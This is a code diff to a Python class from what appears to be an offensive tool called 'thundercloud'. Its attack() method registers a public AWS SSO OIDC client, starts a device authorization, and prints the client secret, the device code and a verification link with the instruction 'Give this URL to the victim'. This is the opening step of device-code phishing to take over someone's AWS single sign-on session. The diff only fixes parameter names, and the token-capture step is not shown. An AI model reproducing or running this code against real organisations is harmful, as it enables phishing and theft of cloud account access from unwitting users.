@@ -6,22 +6,20 @@ import boto3
 
 class AWSSSO:
     pass
-    def attack(self):
-        region = "us-east-2"
-        url = "https://something.awsapps.com"
+    def attack(self, url, region):
         sso_oidc = boto3.client('sso-oidc', region_name= region)
         client = sso_oidc.register_client(
-            client_name = 'thundercloud',
-            client_type = 'public'
+            clientName = 'thundercloud',
+            clientType = 'public'
         )
         client_id = client.get('clientId')
         client_secret = client.get('clientSecret')
         authz = sso_oidc.start_device_authorization(
             clientId = client_id,
-            client_secret = client_secret,
+            clientSecret = client_secret,
             startUrl = url
         )
         url = authz.get('verificationUriComplete')
         deviceCode = authz.get('deviceCode')
         print(client_id, client_secret, deviceCode)
-        print("Give this URL to the victim" +  url)
+        print("Give this URL to the victim\n" + url)
